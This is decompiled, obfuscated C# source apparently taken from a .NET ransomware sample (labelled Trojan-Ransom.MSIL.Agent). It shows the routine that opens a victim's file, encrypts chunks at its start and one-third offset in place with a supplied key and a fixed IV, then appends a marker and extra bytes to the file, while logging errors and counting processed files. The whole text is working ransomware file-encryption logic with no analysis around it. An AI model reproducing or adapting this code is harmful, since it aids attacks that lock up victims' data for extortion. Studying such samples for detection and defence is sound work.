// Decompiled with JetBrains decompiler
// Type: oXSOOyVgTNm.bsHFtVGxaUZhONS
// Assembly: Skylandshare, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BA04C86B-6DB4-4F58-B4B2-0DD203E57103
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-8d268be58a27d2c980b807ffe703ea28b0fd0cd1ba2e455902faebe9ec17c52e.exe

using ceQNxnERCANV;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace oXSOOyVgTNm
{
  internal sealed class bsHFtVGxaUZhONS
  {
    [NonSerialized]
    internal static GetString \u0083;

    public static int LEgVKzEZiLhAwUy([In] long obj0) => (int) obj0;

    public static void fymkhkKbxkbn(
      string uurlRnGsxqhkfvTZX,
      string AseLdWDkvIh,
      string RGQhBZBATEEoc,
      byte[] bdrUBoUadTCm = null)
    {
      try
      {
        using (FileStream fileStream = new FileStream(uurlRnGsxqhkfvTZX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
        {
          int num1 = bsHFtVGxaUZhONS.LEgVKzEZiLhAwUy(fileStream.Length) / 3;
          if (num1 < 0)
            num1 *= -1;
          int num2;
          try
          {
            num2 = Convert.ToInt32(AseLdWDkvIh) * Convert.ToInt32(fileStream.Length) / 100;
            if (num2 < 0)
              num2 *= -1;
          }
          catch
          {
            num2 = int.MaxValue;
          }
          if (num1 < num2)
            num2 = num1 - Convert.ToInt32(AseLdWDkvIh) * 1000 * 1000;
          int num3 = 32;
          int LqCIHtYFtyWgwmy = (int) Math.Round((double) num2 / (double) num3, MidpointRounding.AwayFromZero) * num3;
          for (int index = 0; index < 2; ++index)
          {
            byte[] numArray = bsHFtVGxaUZhONS.nvyEeuZZfriZQ(uurlRnGsxqhkfvTZX, fileStream, LqCIHtYFtyWgwmy, num1 * index);
            byte[] qDdQUpzOTSsU;
            if (!NuHMiFuRoVNiZNRl.DseMmyGrBoOjezM)
              qDdQUpzOTSsU = xDMypKOxUD.EmzieFXgUGooI(numArray, Encoding.ASCII.GetBytes(RGQhBZBATEEoc), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            else
              qDdQUpzOTSsU = RfklKQbYsGtli.zKFUoKSoRuLY(numArray, Encoding.ASCII.GetBytes(RGQhBZBATEEoc), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            bsHFtVGxaUZhONS.wHOpfQAixavz(uurlRnGsxqhkfvTZX, fileStream, qDdQUpzOTSsU, num1 * index);
          }
        }
        byte[] buffer = NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk ? Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(bsHFtVGxaUZhONS.\u0083(107398764)) + NuHMiFuRoVNiZNRl.VrSebPGaWq(bsHFtVGxaUZhONS.\u0083(107399780)) + Convert.ToString(AseLdWDkvIh) + NuHMiFuRoVNiZNRl.VrSebPGaWq(bsHFtVGxaUZhONS.\u0083(107399780))) : Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(bsHFtVGxaUZhONS.\u0083(107398764)) + NuHMiFuRoVNiZNRl.VrSebPGaWq(bsHFtVGxaUZhONS.\u0083(107399757)) + Convert.ToString(AseLdWDkvIh) + NuHMiFuRoVNiZNRl.VrSebPGaWq(bsHFtVGxaUZhONS.\u0083(107399757)));
        if (!NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk)
        {
          using (FileStream fileStream = new FileStream(uurlRnGsxqhkfvTZX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
            fileStream.Write(buffer, 0, buffer.Length);
        }
        else
        {
          using (FileStream fileStream = new FileStream(uurlRnGsxqhkfvTZX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            fileStream.Write(bdrUBoUadTCm, 0, bdrUBoUadTCm.Length);
            fileStream.Write(buffer, 0, buffer.Length);
          }
        }
      }
      catch (Exception ex1)
      {
        if (NuHMiFuRoVNiZNRl.sfIQAmNvQu)
        {
          try
          {
            File.AppendAllText(NuHMiFuRoVNiZNRl.DFeZKWhzZEN, bsHFtVGxaUZhONS.\u0083(107385498) + uurlRnGsxqhkfvTZX + bsHFtVGxaUZhONS.\u0083(107398783) + ex1.Message + bsHFtVGxaUZhONS.\u0083(107396708));
          }
          catch (Exception ex2)
          {
          }
        }
        ++NuHMiFuRoVNiZNRl.OePGqyfYpLiYf;
      }
      ++NuHMiFuRoVNiZNRl.cLVmkVhYZQAqR;
    }

    public static byte[] nvyEeuZZfriZQ(
      string caCVJHjOEbcuh,
      FileStream RJRQiuKCgHfFp,
      int LqCIHtYFtyWgwmy,
      int GQriETrdBBX = 0)
    {
      byte[] buffer = new byte[LqCIHtYFtyWgwmy];
      RJRQiuKCgHfFp.Position = (long) GQriETrdBBX;
      RJRQiuKCgHfFp.Read(buffer, 0, LqCIHtYFtyWgwmy);
      return buffer;
    }

    public static void wHOpfQAixavz(
      string GWiTyhBKzlXtJDQ,
      FileStream MErmcYUvba,
      byte[] qDdQUpzOTSsU,
      int nzghQVOVWemWwY = 0)
    {
      MErmcYUvba.Position = (long) nzghQVOVWemWwY;
      MErmcYUvba.Write(qDdQUpzOTSsU, 0, qDdQUpzOTSsU.Length);
    }

    static bsHFtVGxaUZhONS() => Strings.CreateGetStringDelegate(typeof (bsHFtVGxaUZhONS));
  }
}
